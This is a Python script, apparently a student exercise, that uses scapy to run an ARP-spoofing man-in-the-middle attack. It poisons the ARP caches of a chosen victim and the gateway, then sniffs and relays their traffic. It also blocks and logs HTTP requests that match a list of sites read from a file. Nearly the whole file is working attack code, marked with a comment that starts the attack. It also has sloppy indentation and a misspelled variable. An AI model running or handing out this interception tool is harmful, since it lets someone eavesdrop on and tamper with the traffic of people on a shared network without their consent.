import socket
import subprocess, shlex
from scapy.all import *
import sys
from uuid import getnode as get_mac
import threading


def sendfakearp():
	while 1:
		send(ARP(op=2, pdst=Senderip, psrc=Receiverip, hwdst=Sendermac, hwsrc=Mymac))
		time.sleep(5)

def getpkt():
	sniff(prn=pkt_callback, lfilter=lambda d: d.dst == Mymac, store=1)#filter is that gets only mymac
	
Myip =""
Mymac=""
Senderip=""
Seddermac=""
Receiverip=""
Receivermac=""


raw_packet_cache = None

blacklist = []
f = open("./mal_site.txt",'r')

for line in f:
        line = str(line)
        if line.find('\n'):
                line = line.strip('\n')
        if line.find('http://')>-1:
                line = line.strip('http://')
        line = line.strip()
        blacklist.append(line)

f.close
#log = open("log.txt",'w')


def pkt_callback(pkt):
	if ARP in pkt:
		return
			
	if pkt[0].haslayer(UDP): #this is for to delet UDP chksum 
		if pkt[IP].src==Senderip:
           		pkt[Ether].src=Mymac
			pkt[Ether].dst=Receivermac
            		del pkt.len
			del pkt[UDP].chksum
            		del pkt[UDP].len
            		del pkt.chksum
            		pkt = pkt.__class__(str(pkt))
            		sendp(pkt)

		if pkt[IP].src==Receiverip : 
			pkt[Ether].src=Mymac
			pkt[Ether].dst=Sendermac
		        del pkt.len
		        del pkt[UDP].len
			del pkt[UDP].chksum
		        del pkt.chksum
		        pkt = pkt.__class__(str(pkt))
		        sendp(pkt)

	else :
		#####Block URL################
		if pkt[TCP].dport==80 :
			for URL in blacklist:
                        	if str(pkt.sprintf("{Raw:%Raw.load%}")).find(URL)!=-1:
					log = open("log.txt",'a+')
					txt = "%s is Blocked!!!\n" % URL
					log.write(txt)
					log.close()
                                	return
		#######Block URL#############
		if pkt[IP].src==Senderip: 
		        pkt[Ether].src=Mymac
		        pkt[Ether].dst=Receivermac
			del pkt.len
	           	del pkt.chksum
			pkt = pkt.__class__(str(pkt))
			sendp(pkt)

		if pkt[IP].src==Receiverip: 
        		pkt[Ether].src=Mymac
			pkt[Ether].dst=Sendermac

		        del pkt.len
		        del pkt.chksum
		        pkt = pkt.__class__(str(pkt))

		        sendp(pkt)


#Get MY Address!!!!!!!!!!!!
strs = subprocess.check_output(shlex.split('ip r l'))
Myip  = strs.split('src')[-1].split()[0]
Mymac = get_mac()
Mymac =':'.join(("%012X" % Mymac)[i:i+2] for i in range(0, 12, 2))
Mymac= Mymac.lower()
print "Myip :"+ Myip+"  Mymac :"+Mymac


#Get Receiver Address!!!!!!!!!!!
Receiverip = strs.split('default via')[-1].split()[0]
send(ARP(op=1, pdst=Receiverip, psrc=Myip, hwdst="ff:ff:ff:ff:ff:ff"))
result, unanswered = sr(ARP(op=ARP.who_has, pdst=Receiverip))
Receivermac = result[0][1].hwsrc
print "Receiverip : "+Receiverip+" Receivermac : "+Receivermac

#Get Sender Address!!!!!!!!!!!
Senderip=raw_input("Enter SenderIP : ")
print Senderip
send(ARP(op=1, pdst=Senderip, psrc=Myip, hwdst="ff:ff:ff:ff:ff:ff"))
result, unanswered = sr(ARP(op=ARP.who_has, pdst=Senderip))
Sendermac=result[0][1].hwsrc
print "Senderip : "+Senderip+" Sendermac : "+Sendermac

#Start Attack!!!
th = threading.Thread(target=sendfakearp, args=())
th1 = threading.Thread(target=getpkt, args=()) 
th.start()
th1.start()
th.join()
th1.join()

